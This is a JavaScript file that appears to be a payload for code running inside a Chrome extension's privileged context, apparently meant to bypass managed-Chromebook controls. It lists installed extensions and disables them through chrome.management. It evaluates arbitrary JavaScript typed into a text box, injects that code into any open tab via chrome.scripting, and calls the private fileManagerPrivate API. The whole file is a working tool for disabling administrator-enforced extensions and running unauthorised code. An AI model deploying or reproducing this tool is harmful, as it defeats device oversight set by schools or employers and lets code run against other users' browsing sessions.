// utils
const utils = {
  handleInAnimationFrame: (cb, thiz = null, args = []) => {
    const handleCallbacks_ = [];
    handleCallbacks_.push({
      f: cb,
      t: performance.now(),
    });

    requestAnimationFrame(function animate(t) {
      for (const cb of handleCallbacks_) {
        let m = cb.f.apply(null, [t - cb.t]);
        if (m === 1) return;
        if (m) handleCallbacks_.splice(handleCallbacks_.indexOf(cb), 1);
      }
      requestAnimationFrame(animate);
    });
  },

  getFS: () => {
    return new Promise((resolve) => {
      webkitRequestFileSystem(TEMPORARY, 2 * 1024 * 1024, resolve);
    });
  },

  writeFile: async (fs, file, data) => {
    return new Promise((resolve, reject) => {
      fs.root.getFile(file, { create: true }, (entry) => {
        entry.remove(() => {
          fs.root.getFile(file, { create: true }, (entry) => {
            entry.createWriter((writer) => {
              writer.write(new Blob([data]));
              writer.onwriteend = resolve.bind(null, entry.toURL());
            });
          });
        });
      });
    });
  },
};

// templates
const templates = {
  managementTemplate: `
    <div id="chrome_management_disable_ext">
      <h1>Chrome Management: Disable Extensions</h1>
      <p class="description">This functionality was granted by the members of silly goober money gang</p>
      <p class="description">We love casting fun times</p>
      <br/>
      <button id="current-extension">Disable injected extension</button>
      <br/><br/>
      <ul class="extlist"></ul>
    </div>
  `,

  defaultExtensionTemplate: `
    <div id="ext_default">
      <div id="default_extension_capabilities">
        <h1>Default Extension Capabilities</h1>
        <h2>Evaluate code</h2>
        <div class="container">
          <textarea id="code" placeholder="Enter JavaScript to inject"></textarea>
        </div>
        <button id="code-run">Run</button>
        <div id="code-output"></div>
      </div>
      <div id="extension_tabs_default">
        <button id="tabreload">Refresh Tabs</button>
        <ul></ul>
        <!-- <input id="TabURLInput" /> <button id="TabURLSubmit">Create</button> -->
      </div>
    </div>
  `,

  fileManagerPrivateTemplate: `
    <div id="fileManagerPrivate_cap">
      <div id="FMP_openURL">
        <button id="btn_FMP_openURL">Open URL in Skiovox window</button>
      </div>
    </div>
  `,

  htmlStyle: `
    <style>
      body {
        font-family: Arial, sans-serif;
        background-color: #202124;
        color: #fff;
        margin: 0;
        padding: 20px;
      }

      body::-webkit-scrollbar {
        display: none;
      }

      #chrome_management_disable_ext {
        max-width: 800px;
        margin: 0 auto;
      }

      #ext_default {
        max-width: 1200px;
        margin: 0 auto;
      }

      h1 {
        font-size: 24px;
        margin-bottom: 20px;
      }

      .description {
        margin-bottom: 20px;
        color: #9aa0a6;
      }

      .extension-disabler {
        display: flex;
        justify-content: space-between;
        align-items: center;
        background-color: #292a2d;
        padding: 15px;
        border-radius: 8px;
        margin-bottom: 20px;
      }

      ul {
        list-style-type: none;
        padding: 0;
        padding-bottom: 50px;
      }

      .extension-card {
      /*   background-color: #292a2d; */
        border: 2px solid #292a2d;
        margin-bottom: 10px;
        padding: 15px;
        border-radius: 8px;
        display: flex;
        justify-content: start;
        align-items: center;
      }

      .extension-card:has(input:checked) {
        background-color: #292a2d;
        border: 2px solid #0000;
      }

      .extension-icon {
        width: 32px;
        padding-right: 20px;
        cursor: pointer;
      }

      .extension-name {
        font-weight: bold;
      }

      .toggle-switch {
        margin-left: auto; 
        margin-right: 0;
        position: relative;
        display: inline-block;
        width: 60px;
        height: 36px;
      }

      .toggle-switch input {
        opacity: 0;
        width: 0;
        height: 0;
      }

      .slider {
        position: absolute;
        cursor: pointer;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background-color: #0000;
        transition: .4s;
        border-radius: 34px;
        border: 2px solid #292a2d;
        
      }

      .slider:before {
        position: absolute;
        content: "";
        height: 26px;
        width: 26px;
        left: 4px;
        bottom: 4px;
        background-color: white;
        transition: .4s;
        border-radius: 50%;
      }

      input:checked+.slider {
        background-color: #0df;
        border: 2px solid #222;
      }

      input:checked+.slider:before {
        transform: translateX(24px);
      }

      .tablist-item {
        border: 2px solid #292a2d;
        margin-bottom: 10px;
        padding: 15px;
        border-radius: 8px;
        display: flex;
        justify-content: start;
        align-items: center;
      }
      
      .tablist-item img {
        max-width: 32px;
      }

      .tablist-item span {
        padding: 10px, 0;
        text-overflow: ellipsis;
        width: 100%;
        white-space: nowrap;
        overflow: hidden;
        word-break: break-all;
        }
        
        .tablist-item span:hover{
          overflow: visible; 
          white-space: normal;
          height:auto;  
        }
        
        button {
        background-color: #4CAF50;
        color: white;
        border: none;
        padding: 9px 15px;
        text-align: center;
        border-radius: 5px;
        margin: 4px 2px;
        cursor: pointer;
        transition: background-color 0.3s;

        
        text-decoration: none;
        display: inline-block;
      }

      button:hover {
        background-color: #45a049;
      }

      button:disabled {
        background-color: #cccccc;
        cursor: not-allowed;
      }

      #current-extension {
        background-color: #f44336;
        font-family: Arial;
        font-size: medium;
        font-weight: bold;
      }

      #current-extension:hover {
        background-color: #da190b;
      }
      .container {
                  display: flex;
                  gap: 10px;
              }
      #code-run {
        align-self: flex-start;
        background-color: #4CAF50;
        color: white;
        border: none;
        cursor: pointer;
      }
      #code {
        background: #18191b;
        color: white;
        width: 100%;
        min-height: 50px;
        height: 200px;
        resize: both;
        border: 1px solid #9aa0a6;
        border-radius: 10px;
        font-family: Consolas;
      }
      .footer {
        display: inline;
        float: right;
        margin: 10px 5px;
        color: #83898e;
      }
    </style>
  `,
};

// extensionManager
class ExtensionManager {
  constructor() {
    this.extlist_element = null;
    this.savedExtList = [];
  }

  createExtensionCard(name, id, enabled, icon_url) {
    const li = document.createElement("li");
    li.className = "extension-card";
    li.innerHTML = `
      <img class="extension-icon" src="${icon_url}"/>
      <span class="extension-name">${name} (${id})</span>
      <label class="toggle-switch">
        <input type="checkbox" ${enabled ? "checked" : ""}>
        <span class="slider"></span>
      </label>
    `;
    return li;
  }

  async updateExtensionStatus() {
    this.extlist_element.innerHTML = "";
    return new Promise((resolve) => {
      chrome.management.getAll((extlist) => {
        extlist.forEach((e) => {
          if (e.id === new URL(new URL(location.href).origin).host) return;

          const icon = e.icons.find((ic) => ic.size === 128) ?? e.icons.at(-1);
          let card = this.createExtensionCard(e.name, e.id, e.enabled, icon.url);
          
          let cardInput = card.querySelector("input");
          cardInput.addEventListener("change", (event) => {
            chrome.management.setEnabled(e.id, event.target.checked);
          });

          card.querySelector(".extension-icon").addEventListener("click", () => {
            cardInput.checked = !cardInput.checked;
            cardInput.dispatchEvent(new Event('change'));
          });

          this.extlist_element.appendChild(card);
        });
        this.savedExtList = extlist;
        resolve();
      });
    });
  }

  async initialize() {
    document.body.insertAdjacentHTML("beforeend", templates.managementTemplate);
    this.extlist_element = document.querySelector(".extlist");
    await this.updateExtensionStatus();

    const container_extensions = document.body.querySelector("#chrome_management_disable_ext");
    container_extensions.querySelector("#current-extension").onclick = async () => {
      try {
        const grabidtokill = chrome.runtime.id;
        chrome.management.setEnabled(grabidtokill, false);
      } catch {
        alert("unsuccessful");
      }
    };
  }
}

// defaultExtensionCapabilities
class DefaultExtensionCapabilities {
  constructor() {
    this.disarmed = false;
    this.tabListInProgress = false;
    this.previewing = false;
  }

  activate() {
    document.body.insertAdjacentHTML("beforeend", templates.defaultExtensionTemplate);
    
    document.body
      .querySelector("#ext_default")
      .querySelectorAll("button")
      .forEach((btn) => {
        btn.addEventListener("click", this.onBtnClick_.bind(this, btn));
      });

    this.updateTabList();
    
    for (let i in chrome.tabs) {
      if (i.startsWith("on")) {
        chrome.tabs[i].addListener(() => {
          this.updateTabList();
        });
      }
    }
  }

  updateTabList() {
    if (this.disarmed || this.tabListInProgress) return;

    this.tabListInProgress = true;
    const tablist = document.body.querySelector("#extension_tabs_default ul");
    tablist.innerHTML = "";

    chrome.windows.getAll((windows) => {
      windows.forEach((window) => {
        chrome.tabs.query({ windowId: window.id }, (tabInfos) => {
          tabInfos.forEach((info) => {
            const div = this.createTabListItem(info);
            tablist.appendChild(div);
          });
          this.tabListInProgress = false;
        });
      });
    });
  }

  createTabListItem(info) {
    const div = document.createElement("div");
    div.className = "tablist-item";
    div.innerHTML = `<img ${chrome.tabs && (info.favIconUrl?.length ?? 0) > 0 ? `src="${info.favIconUrl}"` : ""}/><span class="tab-name">${info.title} (${info.url})</span>`;
    
    // const navButton = document.createElement("button");
    // navButton.className = "navigate";
    // navButton.textContent = "Navigate";
    // navButton.onclick = () => {
    //   const inp = div.querySelector("input");
    //   chrome.tabs.update(info.id, { url: inp.value });
    // };

    const previewButton = document.createElement("button");
    previewButton.textContent = "Preview";
    previewButton.onclick = () => this.previewTab(info);

    if (chrome.scripting) {
      const runButton = document.createElement("button");
      runButton.textContent = "Run";
      runButton.onclick = () => runCode(true, info.id);
      div.appendChild(runButton);
    }

    // div.appendChild(navButton);
    div.appendChild(previewButton);
    return div;
  }

  previewTab(info) {
    this.disarm = true;
    this.previewing = true;

    chrome.windows.update(info.windowId, { focused: true }, () => {
      chrome.tabs.update(info.id, { active: true });
    });

    window.currentTimeout = setTimeout(() => {
      clearTimeout(window.currentTimeout);
      chrome.tabs.getCurrent((tab) => {
        chrome.windows.update(tab.windowId, { focused: true }, () => {
          chrome.tabs.update(tab.id, { active: true });
          this.disarm = false;
          this.previewing = false;
        });
      });
    }, 100);
  }

  async onBtnClick_(b) {
    switch (b.id) {
      case "code-run":
        runCode(false);
        break;
      case "tabreload":
        this.updateTabList();
        break;
    }
  }
}

// inject code
async function runCode(onTab, tabId = "") {
  const codeTextarea = document.querySelector("#code");
  let code = codeTextarea.value;
  const outputDiv = document.querySelector("#code-output");

  if (onTab) {
    code = `chrome.scripting.executeScript({
      target: {tabId: ${tabId}},
      func: () => {${code}}
    });`;
  }

  try {
    const originalLog = console.log;
    console.log = (...args) => {
      outputDiv.innerHTML += args.join(" ") + "<br>";
    };

    const fs = await utils.getFS();
    const url = await utils.writeFile(fs, "src.js", code);
    
    let script = document.body.querySelector("#evaluate_elem") ?? document.createElement("script");
    script.remove();
    script = document.createElement("script");
    script.id = "evaluate_elem";
    script.src = url;
    document.body.appendChild(script);

    console.log = originalLog;
  } catch (error) {
    outputDiv.innerHTML = `Error: ${error}`;
  }
}

async function initialize() {
  document.open();
  document.write(templates.htmlStyle);
  document.close();

  if (chrome.fileManagerPrivate) {
    chrome.fileManagerPrivate.openURL("data:text/html,<h1>Hello</h1>");
    document.write(templates.fileManagerPrivateTemplate);
    document.body.querySelector("#btn_FMP_openURL").onclick = () => {};
  }

  if (chrome.management.setEnabled) {
    const extensionManager = new ExtensionManager();
    await extensionManager.initialize();
  }

  new DefaultExtensionCapabilities().activate();

  document.body.insertAdjacentHTML("beforeend", `<div class="footer">Miner49ur</div>`);
  document.querySelector("#code-run").addEventListener("click", () => runCode(false));
}

window.onload = initialize;